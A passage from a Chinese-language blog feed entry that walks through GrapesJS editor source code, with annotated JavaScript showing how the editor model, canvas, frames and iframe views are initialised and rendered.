&#123;</span><br><span class="line"><span class="comment">// 实例化 Editor 对象</span></span><br><span class="line"><span class="keyword">const</span> editor = <span class="keyword">new</span> Editor(config).init();</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// 渲染 DOM</span></span><br><span class="line">config.autorender &amp;&amp; editor.render();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// editor/index.js</span></span><br><span class="line"><span class="keyword">var</span> em = <span class="keyword">new</span> EditorModel(c);</span><br><span class="line"><span class="keyword">var</span> editorView = <span class="keyword">new</span> EditorView(&#123;</span><br><span class="line">model: em,</span><br><span class="line">config: c</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">init(opts = &#123;&#125;) &#123;</span><br><span class="line"><span class="comment">// 1.实例化 EditorModel</span></span><br><span class="line">em.init(<span class="keyword">this</span>, &#123; ...c, ...opts &#125;);</span><br><span class="line">&#125;,</span><br><span class="line">render() &#123;</span><br><span class="line"><span class="comment">// 2.渲染 DOM</span></span><br><span class="line">editorView.render();</span><br><span class="line"><span class="keyword">return</span> editorView.el;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. model 创建</span></span><br><span class="line"><span class="comment">// editor/model/Editor.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Backbone.Model.extend(&#123;</span><br><span class="line"><span class="comment">// 继承了 Model, 实例化时会自动调用</span></span><br><span class="line">initialize(c = &#123;&#125;) &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// 依次加载模块</span></span><br><span class="line">deps.forEach(<span class="function"><span class="params">name</span> =&gt;</span> <span class="keyword">this</span>.loadModule(name));</span><br><span class="line">&#125;),</span><br><span class="line">loadModule(moduleName) &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">cfg.em = <span class="keyword">this</span>;</span><br><span class="line">Mod.init(&#123; ...cfg &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将模块设置为 EditorModel 的属性</span></span><br><span class="line">!Mod.private &amp;&amp; <span class="keyword">this</span>.set(Mod.name, Mod);</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// canvas/index.js</span></span><br><span class="line">init(config = &#123;&#125;) &#123;</span><br><span class="line"><span class="comment">// 实例化 CanvasModel</span></span><br><span class="line">canvas = <span class="keyword">new</span> Canvas(config);</span><br><span class="line">CanvasView = <span class="keyword">new</span> canvasView(&#123;</span><br><span class="line">model: canvas,</span><br><span class="line">config: c</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// canvas/model/Canvas.js</span></span><br><span class="line">initialize(config = &#123;&#125;) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; em &#125; = config;</span><br><span class="line">    <span class="keyword">const</span> &#123; styles = [], scripts = [] &#125; = config;</span><br><span class="line"><span class="comment">// 此处 root 优先赋值为 EditorModel 对象，并传入到 Frame 示例(保存为其 attributes 属性)。最终在渲染 FrameView 时，将 grapesjs.init 初始化时容器 container 的子 DOM 元素加入到 iframe 中</span></span><br><span class="line">    <span class="keyword">const</span> root = em &amp;&amp; em.getWrapper();</span><br><span class="line">    <span class="keyword">const</span> css = em &amp;&amp; em.getStyle();</span><br><span class="line"><span class="comment">// 实例化 Frame</span></span><br><span class="line">    <span class="keyword">const</span> frame = <span class="keyword">new</span> Frame(&#123; root, <span class="attr">styles</span>: css &#125;, config);</span><br><span class="line">    styles.forEach(<span class="function"><span class="params">style</span> =&gt;</span> frame.addLink(style));</span><br><span class="line">    scripts.forEach(<span class="function"><span class="params">script</span> =&gt;</span> frame.addScript(script));</span><br><span class="line">    <span class="keyword">this</span>.em = em;</span><br><span class="line">    <span class="keyword">this</span>.set(<span class="string">'frame'</span>, frame);</span><br><span class="line"><span class="comment">// 实例化 Frames(Collection: [frame])</span></span><br><span class="line">    <span class="keyword">this</span>.set(<span class="string">'frames'</span>, <span class="keyword">new</span> Frames([frame], config));</span><br><span class="line">    <span class="keyword">this</span>.listenTo(<span class="keyword">this</span>, <span class="string">'change:zoom'</span>, <span class="keyword">this</span>.onZoomChange);</span><br><span class="line">    <span class="keyword">this</span>.listenTo(em, <span class="string">'change:device'</span>, <span class="keyword">this</span>.updateDevice);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// canvas/model/Frames.js</span></span><br><span class="line"><span class="keyword">import</span> model <span class="keyword">from</span> <span class="string">'./Frame'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Backbone.Collection.extend(&#123;</span><br><span class="line">model,</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// canvas/model/Frame.js</span></span><br><span class="line"><span class="keyword">import</span> model <span class="keyword">from</span> <span class="string">'./Frame'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Backbone.Model.extend(&#123;</span><br><span class="line"><span class="comment">// 由于继承了Backbone.Model，实例化时，会自动将 props 传入值设置到 attributes 属性中。Frame 的实例化参考上文 Canvas 实例化</span></span><br><span class="line">initialize(props, opts = &#123;&#125;) &#123;</span><br><span class="line"><span class="comment">// 从 attributes 获取 root 和 components 等。此处的root为 grapesjs.init 初始化时，容器 container 的子 DOM 元素，在渲染 FrameView 时会用到</span></span><br><span class="line"><span class="keyword">const</span> &#123; root, styles, components &#125; = <span class="keyword">this</span>.attributes;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// 如果 root 不存在，则使用一个默认的 Component 代替</span></span><br><span class="line">!root &amp;&amp;</span><br><span class="line">  <span class="keyword">this</span>.set(</span><br><span class="line"><span class="string">'root'</span>,</span><br><span class="line"><span class="keyword">new</span> Component(</span><br><span class="line">  &#123;</span><br><span class="line">type: <span class="string">'wrapper'</span>,</span><br><span class="line">components: components || []</span><br><span class="line">  &#125;,</span><br><span class="line">  modOpts</span><br><span class="line">)</span><br><span class="line">  );</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. view 视图渲染</span></span><br><span class="line"><span class="comment">// editor/view/EditorView.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Backbone.View.extend(&#123;</span><br><span class="line">  initialize() &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">this</span>.pn = model.get(<span class="string">'Panels'</span>);</span><br><span class="line"><span class="comment">// 获取 Canvas 模块</span></span><br><span class="line">    <span class="keyword">this</span>.cv = model.get(<span class="string">'Canvas'</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// 渲染 Canvas 模块</span></span><br><span class="line">    $el.append(<span class="keyword">this</span>.cv.render());</span><br><span class="line">    $el.append(<span class="keyword">this</span>.pn.render());</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// canvas/view/CanvasView.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Backbone.View.extend(&#123;</span><br><span class="line">initialize(o) &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">const</span> frames = model.get(<span class="string">'frames'</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">this</span>.frames = <span class="keyword">new</span> FramesView(&#123;</span><br><span class="line">  collection: frames, <span class="comment">// 设置 collection 属性</span></span><br><span class="line">  config: &#123;</span><br><span class="line">...config,</span><br><span class="line">canvasView: <span class="keyword">this</span>,</span><br><span class="line">renderContent: <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;,</span><br><span class="line">render() &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">const</span> frms = model.get(<span class="string">'frames'</span>);</span><br><span class="line">frms.listenToLoad();</span><br><span class="line"><span class="comment">// 渲染 Frames</span></span><br><span class="line">frames.render();</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// canvas/view/FramesView.js</span></span><br><span class="line"><span class="keyword">import</span> DomainViews <span class="keyword">from</span> <span class="string">'domain_abstract/view/DomainViews'</span>;</span><br><span class="line"><span class="keyword">import</span> FrameWrapView <span class="keyword">from</span> <span class="string">'./FrameWrapView'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> DomainViews.extend(&#123;</span><br><span class="line">  itemView: FrameWrapView,</span><br><span class="line">  autoAdd: <span class="number">1</span>,</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// domain_abstract/view/DomainViews.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Backbone.View.extend(&#123;</span><br><span class="line">  initialize(opts = &#123;&#125;, config) &#123;</span><br><span class="line">    <span class="keyword">this</span>.config = config || opts.config || &#123;&#125;;</span><br><span class="line"><span class="comment">// 如果启动自动添加，则监听 collection 的 add 方法调用，如果调用了则执行 this.addTo</span></span><br><span class="line">    <span class="keyword">this</span>.autoAdd &amp;&amp; <span class="keyword">this</span>.listenTo(<span class="keyword">this</span>.collection, <span class="string">'add'</span>, <span class="keyword">this</span>.addTo);</span><br><span class="line">    <span class="keyword">this</span>.items = [];</span><br><span class="line">    <span class="keyword">this</span>.init();</span><br><span class="line">  &#125;,</span><br><span class="line">  addTo(model) &#123;</span><br><span class="line">    <span class="keyword">this</span>.add(model);</span><br><span class="line">  &#125;,</span><br><span class="line">  add(model, fragment) &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// 渲染 itemView</span></span><br><span class="line"><span class="keyword">var</span> itemView = <span class="keyword">this</span>.itemView;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// 判断model(如果是继承，则model为子类的model属性)，不符合则渲染 itemView 属性值</span></span><br><span class="line"><span class="keyword">if</span> (model.view &amp;&amp; reuseView) &#123;</span><br><span class="line">      view = model.view;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      view = <span class="keyword">new</span> itemView(&#123; model, config &#125;, config);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    items &amp;&amp; items.push(view);</span><br><span class="line"><span class="comment">// 渲染</span></span><br><span class="line">    <span class="keyword">const</span> rendered = view.render().el;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  &#125;,</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">var</span> frag = <span class="built_in">document</span>.createDocumentFragment();</span><br><span class="line">    <span class="keyword">this</span>.clearItems();</span><br><span class="line">    <span class="keyword">this</span>.$el.empty();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.collection.length)</span><br><span class="line">  <span class="comment">// 将集合中的元素添加到 DOM 容器</span></span><br><span class="line">      <span class="keyword">this</span>.collection.each(<span class="function"><span class="keyword">function</span>(<span class="params">model</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.add(model, frag);</span><br><span class="line">      &#125;, <span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.$el.append(frag);</span><br><span class="line">    <span class="keyword">this</span>.onRender();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// canvas/view/FrameWrapView.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Backbone.View.extend(&#123;</span><br><span class="line">  initialize(opts = &#123;&#125;, conf = &#123;&#125;) &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">this</span>.em = em;</span><br><span class="line">    <span class="keyword">this</span>.canvas = em &amp;&amp; em.get(<span class="string">'Canvas'</span>);</span><br><span class="line">    <span class="keyword">this</span>.ppfx = config.pStylePrefix || <span class="string">''</span>;</span><br><span class="line"><span class="comment">// 实例化 FrameView</span></span><br><span class="line">    <span class="keyword">this</span>.frame = <span class="keyword">new</span> FrameView(&#123; model, config &#125;);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;,</span><br><span class="line">  render() &#123;</span><br><span class="line"><span class="keyword">const</span> &#123; frame, $el, ppfx, cv, model, el &#125; = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">const</span> &#123; onRender &#125; = model.attributes;</span><br><span class="line"><span class="comment">// 渲染 FrameView(实际是生成一个 iframe 标签)</span></span><br><span class="line">    frame.render();</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// canvas/view/FrameView.js</span></span><br><span class="line">render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; el, $el, ppfx, config &#125; = <span class="keyword">this</span>;</span><br><span class="line">    $el.attr(&#123; <span class="attr">class</span>: ppfx + <span class="string">'frame'</span> &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (config.scripts.length) &#123;</span><br><span class="line">  <span class="comment">// 如果有额外的scripts标签需要加入到iframe中时执行，最终仍然会执行渲染 Body 部分</span></span><br><span class="line">      <span class="keyword">this</span>.renderScripts();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (config.renderContent) &#123;</span><br><span class="line">  <span class="comment">// 渲染 Body 部分</span></span><br><span class="line">      el.onload = <span class="keyword">this</span>.renderBody.bind(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;,</span><br><span class="line">renderBody() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; config, model, ppfx &#125; = <span class="keyword">this</span>;</span><br><span class="line"><span class="comment">// 从 FrameModel 实例中获取，最早是在 Canvas 实例化传入的 EditorModel 值</span></span><br><span class="line">    <span class="keyword">const</span> root = model.get(<span class="string">'root'</span>);</span><br><span class="line">    <span class="keyword">const</span> styles = model.get(<span class="string">'styles'</span>);</span><br><span class="line">    <span class="keyword">const</span> &#123; em &#125; = config;</span><br><span class="line"><span class="comment">// 由于实例化FrameView时，会自动创建iframe标签，所有此时渲染可以获取其 contentDocument 值</span></span><br><span class="line">    <span class="keyword">const</span> doc = <span class="keyword">this</span>.getDoc();</span><br><span class="line">    <span class="keyword">const</span> head = <span class="keyword">this</span>.getHead();</span><br><span class="line">    <span class="keyword">const</span> body = <span class="keyword">this</span>.getBody();</span><br><span class="line">    <span class="keyword">const</span> win = <span class="keyword">this</span>.getWindow();</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// root 为 grapesjs.init 初始化时，容器 container 的子 DOM 元素。将此 DOM 元素用 ComponentView 包装，并加入到 Body 节点中</span></span><br><span class="line"><span class="keyword">this</span>.root = <span class="keyword">new</span> ComponentView(&#123;</span><br><span class="line">      model: root,</span><br><span class="line">      config: &#123;</span><br><span class="line">        ...root.config,</span><br><span class="line">        frameView: <span class="keyword">this</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;).render();</span><br><span class="line">    append(body, <span class="keyword">this</span>.root.el);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/artf/grapesjs&quot; target=&quot;_blank&quot; rel=&quot;
      
    
    </summary>
    
      <category term="web" scheme="http://blog.aezo.cn/categories/web/"/>
    
    
      <category term="js" scheme="http://blog.aezo.cn/tags/js/"/>
    
      <category term="lib" scheme="http://blog.aezo.cn/tags/lib/"/>
    
  </entry>
  
</feed>
